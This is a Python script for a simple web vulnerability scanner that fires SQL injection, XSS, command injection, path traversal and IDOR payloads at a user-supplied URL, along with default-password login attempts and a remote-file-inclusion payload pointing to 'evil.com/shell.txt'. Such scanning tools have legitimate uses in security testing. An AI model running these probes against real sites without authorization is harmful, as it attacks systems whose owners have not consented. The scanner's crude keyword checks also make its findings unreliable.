import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress the specific warning if it appears
warnings.filterwarnings("ignore", category=UserWarning, message="The input looks more like a filename than markup")

def run_tests(url, links):
    vulnerabilities = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        futures.append(executor.submit(test_sql_injection, url, links))
        futures.append(executor.submit(test_xss_injection, url, links))
        futures.append(executor.submit(test_command_injection, url, links))
        futures.append(executor.submit(test_brute_force, url))
        futures.append(executor.submit(test_directory_traversal, url, links))
        futures.append(executor.submit(test_rfi, url, links))
        futures.append(executor.submit(test_lfi, url, links))
        futures.append(executor.submit(test_idor, url, links))

        for future in as_completed(futures):
            vulnerabilities.extend(future.result())
    
    return vulnerabilities

def test_sql_injection(url, links):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in sql_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "sql"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_xss_injection(url, links):
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in xss_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "xss"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_command_injection(url, links):
    command_payloads = ["; ls", "&& ls", "| ls"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in command_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "command"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_brute_force(url):
    brute_force_payloads = [("admin", "admin"), ("admin", "password"), ("user", "123456")]
    vulnerabilities = []

    # Assuming the login form is at /login
    login_url = url + "/login"

    response = requests.get(login_url)
    if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
        if looks_like_html(response.text):
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            form_details = get_form_details(form)

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for username, password in brute_force_payloads:
                    data = {input_tag['name']: username if 'user' in input_tag['name'].lower() else password for input_tag in form_details['inputs']}
                    futures.append(executor.submit(submit_form, form_details, url, data))

                for future in as_completed(futures):
                    form_response = future.result()
                    if form_response.status_code == 200:
                        if "login successful" in form_response.text.lower():
                            vulnerabilities.append((login_url, "Brute Force", f"username: {username}, password: {password}", "POST"))

    return vulnerabilities

def test_directory_traversal(url, links):
    traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in traversal_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "traversal"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_rfi(url, links):
    rfi_payloads = ["http://evil.com/shell.txt"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in rfi_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "rfi"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_lfi(url, links):
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in lfi_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "lfi"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_idor(url, links):
    idor_payloads = ["?user_id=1", "?account_id=1"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for link in links:
            for payload in idor_payloads:
                futures.append(executor.submit(test_payload, url, link, payload, "idor"))

        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerabilities.append(result)

    return vulnerabilities

def test_payload(url, link, payload, test_type):
    full_url = link + payload
    response = requests.get(full_url)
    if response.status_code == 200:
        if test_type == "sql" and ("syntax error" in response.text.lower() or "mysql" in response.text.lower()):
            return (full_url, "SQL Injection", payload, "GET")
        elif test_type == "xss" and payload in response.text:
            return (full_url, "XSS Injection", payload, "GET")
        elif test_type == "command" and ("root" in response.text.lower() or "bin" in response.text.lower()):
            return (full_url, "Command Injection", payload, "GET")
        elif test_type == "traversal" and ("root:x" in response.text or "[extensions]" in response.text):
            return (full_url, "Directory Traversal", payload, "GET")
        elif test_type == "rfi" and ("shell" in response.text):
            return (full_url, "Remote File Inclusion", payload, "GET")
        elif test_type == "lfi" and ("root:x" in response.text or "[extensions]" in response.text):
            return (full_url, "Local File Inclusion", payload, "GET")
        elif test_type == "idor" and ("user" in response.text or "account" in response.text):
            return (full_url, "Insecure Direct Object References", payload, "GET")

    response = requests.get(link)
    if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
        if looks_like_html(response.text):
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                form_details = get_form_details(form)
                data = {input_tag['name']: payload for input_tag in form_details['inputs']}
                form_response = submit_form(form_details, url, data)
                if form_response.status_code == 200:
                    if test_type == "sql" and ("syntax error" in form_response.text.lower() or "mysql" in form_response.text.lower()):
                        return (full_url, "SQL Injection", payload, form_details['method'].upper())
                    elif test_type == "xss" and payload in form_response.text:
                        return (full_url, "XSS Injection", payload, form_details['method'].upper())
                    elif test_type == "command" and ("root" in form_response.text.lower() or "bin" in form_response.text.lower()):
                        return (full_url, "Command Injection", payload, form_details['method'].upper())
                    elif test_type == "traversal" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                        return (full_url, "Directory Traversal", payload, form_details['method'].upper())
                    elif test_type == "rfi" and ("shell" in form_response.text):
                        return (full_url, "Remote File Inclusion", payload, form_details['method'].upper())
                    elif test_type == "lfi" and ("root:x" in form_response.text or "[extensions]" in form_response.text):
                        return (full_url, "Local File Inclusion", payload, form_details['method'].upper())
                    elif test_type == "idor" and ("user" in form_response.text or "account" in form_response.text):
                        return (full_url, "Insecure Direct Object References", payload, form_details['method'].upper())

    return None

def get_form_details(form):
    details = {}
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_name = input_tag.attrs.get('name')
        input_type = input_tag.attrs.get('type', 'text')
        input_value = input_tag.attrs.get('value', '')
        inputs.append({'name': input_name, 'type': input_type, 'value': input_value})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form(form_details, url, data):
    target_url = url + form_details['action']
    if form_details['method'] == 'post':
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def looks_like_html(text):
    """
    Helper function to check if a given text looks like HTML.
    """
    # Ensure the input is a string
    if not isinstance(text, str):
        return False
    return bool(BeautifulSoup(text, "html.parser").find())

def main():
    url = input("Enter the base URL: ")
    links = [url]  # You can expand this to gather more links
    print("Running tests...")

    vulnerabilities = run_tests(url, links)

    if vulnerabilities:
        print("\nVulnerabilities found:")
        for vuln in vulnerabilities:
            full_url, vuln_type, payload, method = vuln
            print(f"URL: {full_url}")
            print(f"Type: {vuln_type}")
            print(f"Payload: {payload}")
            print(f"Method: {method}")
            print("-" * 20)
    else:
        print("No vulnerabilities found.")

if __name__ == "__main__":
    main()